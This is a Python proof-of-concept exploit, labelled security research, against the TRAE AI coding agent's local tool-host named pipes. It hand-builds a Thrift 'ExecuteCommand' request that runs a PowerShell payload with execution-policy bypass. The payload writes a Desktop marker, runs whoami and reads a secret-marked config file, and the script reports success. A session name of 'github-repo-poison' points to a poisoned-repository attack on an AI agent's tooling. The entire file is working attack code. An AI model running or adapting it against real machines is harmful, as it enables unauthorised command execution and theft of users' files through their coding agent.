#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TRAE host pipe bridge: unauth ExecuteCommand (security research only)."""
from __future__ import annotations

import ctypes
import json
import os
import struct
import subprocess
import sys
import time
from ctypes import wintypes
from pathlib import Path

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
INVALID = ctypes.c_void_p(-1).value
k32 = ctypes.windll.kernel32
k32.CreateFileW.restype = ctypes.c_void_p

READ_FILE = r"C:\Users\1\.config\1.txt"
CMD_ID = "icube.common.commands.tooling.runCommandInTerminal"


def w32(v):
    return struct.pack(">I", v & 0xFFFFFFFF)


def w16(v):
    return struct.pack(">H", v & 0xFFFF)


def ws(s: str) -> bytes:
    b = s.encode("utf-8")
    return w32(len(b)) + b


def thrift_exec(session_id: str, command: str) -> bytes:
    args_json = json.dumps({"command": command}, separators=(",", ":"), ensure_ascii=False)
    body = bytes([11]) + w16(1) + ws(session_id)
    body += bytes([11]) + w16(2) + ws(CMD_ID)
    body += bytes([15]) + w16(3) + bytes([11]) + w32(1) + ws(args_json)
    body += bytes([0])
    return w32(0x80010001) + ws("ExecuteCommand") + w32(1) + bytes([12]) + w16(1) + body + bytes([0])


def list_host_pipes() -> list[str]:
    try:
        out = subprocess.check_output(
            [
                "powershell",
                "-NoProfile",
                "-Command",
                "(Get-ChildItem \\\\.\\pipe\\ -EA SilentlyContinue | "
                "? { $_.Name -like 'agent-code-toolhost-*' }).Name",
            ],
            text=True,
            errors="ignore",
            timeout=15,
        )
        return [x.strip() for x in out.splitlines() if x.strip()]
    except Exception:
        return []


def seed_pipes() -> list[str]:
    p = Path(os.environ.get("TEMP", ".")) / "trae-pathb" / "host_pipe.txt"
    if not p.exists():
        return []
    return [ln.strip() for ln in p.read_text(errors="ignore").splitlines() if ln.strip()]


def exchange(pipe: str, req: bytes) -> bytes | None:
    h = k32.CreateFileW(
        "\\\\.\\pipe\\" + pipe, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None
    )
    if h in (None, 0, INVALID):
        return None
    try:
        n = wintypes.DWORD()
        buf = ctypes.create_string_buffer(req)
        if not k32.WriteFile(ctypes.c_void_p(h), buf, len(req), ctypes.byref(n), None):
            return None
        avail = wintypes.DWORD()
        for _ in range(160):
            if k32.PeekNamedPipe(ctypes.c_void_p(h), None, 0, None, ctypes.byref(avail), None) and avail.value:
                break
            time.sleep(0.05)
        out = ctypes.create_string_buffer(400000)
        n = wintypes.DWORD()
        if not k32.ReadFile(ctypes.c_void_p(h), out, len(out), ctypes.byref(n), None):
            return None
        return out.raw[: n.value]
    finally:
        k32.CloseHandle(ctypes.c_void_p(h))


def wait_job(resp: bytes):
    text = resp.decode("latin1", "ignore")
    i = text.find("job-")
    if i < 0:
        return None, "", ""
    j = i
    while j < len(text) and (text[j].isalnum() or text[j] == "-"):
        j += 1
    job = text[i:j]
    base = Path(os.environ["TEMP"]) / "trae-agent-toolhost" / "jobs" / job
    st, lg = base / "state.json", base / "output.log"
    state = ""
    for _ in range(400):
        if st.exists():
            state = st.read_text(errors="ignore")
            if "Exited" in state or "Failed" in state:
                break
        time.sleep(0.1)
    log = lg.read_text(errors="ignore") if lg.exists() else ""
    return job, state, log


def desktop_dir() -> Path:
    try:
        out = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command", "[Environment]::GetFolderPath('Desktop')"],
            text=True,
            errors="ignore",
            timeout=10,
        ).strip()
        if out:
            return Path(out)
    except Exception:
        pass
    return Path(os.environ["USERPROFILE"]) / "Desktop"


def ensure_read_file() -> Path:
    p = Path(READ_FILE)
    p.parent.mkdir(parents=True, exist_ok=True)
    if not p.exists():
        p.write_text(
            f"SECRET_MARKER_CONFIG_1 content={time.strftime('%Y-%m-%dT%H:%M:%S')}\n",
            encoding="utf-8",
        )
    return p


def build_payload(tag: str, marker: Path, read_file: Path) -> str:
    m = str(marker).replace("'", "''")
    r = str(read_file).replace("'", "''")
    # PowerShell Set-Content + Get-Content — reliable under toolhost
    return (
        "powershell -NoProfile -ExecutionPolicy Bypass -Command "
        f"\"Set-Content -LiteralPath '{m}' -Value 'GITHUB_REPO_POISON_OK {tag}' -Encoding UTF8; "
        f"Write-Output ('WRITE_EXISTS=' + (Test-Path -LiteralPath '{m}')); "
        f"Write-Output '=== whoami ==='; whoami; "
        f"Write-Output '=== read_config_1 ==='; "
        f"if (Test-Path -LiteralPath '{r}') {{ Get-Content -LiteralPath '{r}' -Raw }} "
        f"else {{ 'MISSING_FILE' }}\""
    )


def main() -> int:
    try:
        sys.stdout.reconfigure(errors="replace")
    except Exception:
        pass

    tag = os.environ.get("DEVKIT_TAG") or time.strftime("GH_%Y%m%d_%H%M%S")
    desk = desktop_dir()
    marker = desk / f"devkit_host_marker_{tag}.txt"
    read_file = ensure_read_file()
    cmd = build_payload(tag, marker, read_file)

    pipes = list_host_pipes() or seed_pipes()
    print(f"tag={tag}")
    print(f"desktop={desk}")
    print(f"marker={marker}")
    print(f"read_file={read_file}")
    print(f"pipes={pipes}")

    if not pipes:
        print("HOST_CONNECT=FAIL")
        print("ERROR=no_host_pipe")
        print("HINT=Open TRAE Agent first so agent-code-toolhost-* exists")
        return 2

    ok = False
    last_log = ""
    for pipe in pipes:
        print(f"try_pipe={pipe}")
        resp = exchange(pipe, thrift_exec("github-repo-poison", cmd))
        if not resp:
            print("exchange=FAIL")
            continue
        job, state, log = wait_job(resp)
        last_log = log or ""
        print(f"job={job}")
        print(f"resp_len={len(resp)}")
        print("----state----")
        print((state or "")[:600])
        print("----output.log----")
        print(last_log[:3000])
        if job and ('"exit_code":0' in (state or "") or '"exit_code": 0' in (state or "")):
            ok = True
            break

    print("----RESULT----")
    print(f"desktop_exists={marker.exists()}")
    if marker.exists():
        print("DESKTOP_CONTENT=")
        print(marker.read_text(encoding="utf-8-sig", errors="ignore").strip())
    # extract read content from log
    extracted = ""
    if "=== read_config_1 ===" in last_log:
        extracted = last_log.split("=== read_config_1 ===", 1)[1].strip()
    print("READ_FILE_PATH=" + str(read_file))
    print("READ_CONTENT_FROM_HOST=")
    print(extracted if extracted else "<empty>")
    print(f"HOST_CONNECT={'OK' if ok else 'FAIL'}")
    print(f"DESK_MARKER={marker.exists()}")
    print(f"READ_OK={bool(extracted) and not extracted.startswith('MISSING')}")
    success = marker.exists() and bool(extracted) and "MISSING" not in extracted[:20]
    print(f"SUCCESS={success}")
    return 0 if success else 1


if __name__ == "__main__":
    raise SystemExit(main())
